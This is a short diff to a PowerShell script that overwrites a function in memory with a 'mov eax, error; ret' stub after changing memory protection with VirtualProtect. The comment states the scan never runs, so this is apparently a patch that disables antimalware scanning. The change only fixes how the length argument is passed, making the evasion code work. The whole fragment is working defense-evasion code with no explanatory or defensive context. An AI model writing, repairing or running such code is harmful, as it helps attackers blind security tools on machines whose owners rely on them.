@@ -23,9 +23,10 @@ public class Mem {
         # ret (0xC3) — function returns immediately, scan never runs
         $patch = [byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
         $op    = [uint32]0
-        [Mem]::VirtualProtect($ptr, [UIntPtr]6, 0x40, [ref]$op) | Out-Null
+        $len   = [System.UIntPtr]::new([uint64]6)
+        [Mem]::VirtualProtect($ptr, $len, 0x40, [ref]$op) | Out-Null
         [Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
-        [Mem]::VirtualProtect($ptr, [UIntPtr]6, $op, [ref]$op)  | Out-Null
+        [Mem]::VirtualProtect($ptr, $len, $op, [ref]$op)  | Out-Null
         Write-Host "[+] Patch applied"
     } catch {
         Write-Host "[-] Patch failed: $_"
